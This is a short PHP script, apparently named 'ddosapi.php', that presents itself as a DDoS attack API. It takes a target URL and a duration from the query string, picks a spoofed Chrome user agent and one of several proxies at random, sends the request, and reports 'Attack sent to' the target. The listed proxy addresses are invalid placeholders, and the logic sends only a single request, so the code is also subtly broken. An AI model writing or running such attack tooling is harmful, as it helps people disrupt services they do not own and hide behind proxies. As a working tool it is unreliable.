<?php

// Array of Chrome user agents
$userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
];

// Array of proxies
$proxies = [
    'http://123.456.789.000:8080',
    'http://234.567.890.123:3128',
    'http://345.678.901.234:8080',
    'http://456.789.012.345:8000',
    'http://567.890.123.456:9000',
];

// Function to get a random user agent
function getRandomUserAgent($userAgents) {
    $randomIndex = array_rand($userAgents);
    return $userAgents[$randomIndex];
}

// Function to get a random proxy
function getRandomProxy($proxies) {
    $randomIndex = array_rand($proxies);
    return $proxies[$randomIndex];
}

// Get target and time from query string
$target = $_GET['target'] ?? '';
$time = $_GET['time'] ?? '';

// Perform the attack
if (!empty($target) && !empty($time)) {
    $userAgent = getRandomUserAgent($userAgents);
    $proxy = getRandomProxy($proxies);
    $url = $target . '?time=' . $time . '&proxy=' . $proxy;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_exec($ch);
    curl_close($ch);

    echo "Attack sent to: $target with user agent: $userAgent and proxy: $proxy";
} else {
    echo "Usage: ddosapi.php?target=<target>&time=<time>";
}
?>
